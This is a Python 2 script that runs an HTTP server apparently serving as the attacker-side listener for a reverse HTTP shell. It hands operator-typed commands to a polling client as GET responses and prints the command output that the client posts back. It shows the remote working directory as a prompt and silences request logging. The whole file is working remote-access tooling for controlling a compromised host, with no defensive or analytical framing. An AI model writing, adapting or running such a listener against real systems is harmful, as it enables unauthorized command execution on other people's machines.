#!/usr/bin/python
import BaseHTTPServer

HOST = '10.200.32.131'
PORT = 80


class Handler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):
        cmd = raw_input('{}{}\\>{} '.format(bcolors.OKGREEN, s.headers['Current-Location'], bcolors.ENDC))
        if cmd == 'terminate':
            print('{}[!] Connection closed. Press ^C to shutdown the server.'.format(bcolors.WARNING))
        s.send_response(200)
        s.send_header('Content-type', 'text/html')
        s.end_headers()
        s.wfile.write(cmd)


    def do_POST(s):
        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-length'])
        content = s.rfile.read(length)
        if content.startswith('#!#'):
            content = "{}{}{}".format(bcolors.FAIL, content[3:], bcolors.ENDC)
        print content

    def log_message(self, format, *args):
        return

# Colors
class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST, PORT), Handler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\n[!] Server is terminated{}'.format(bcolors.ENDC))
        httpd.server_close()
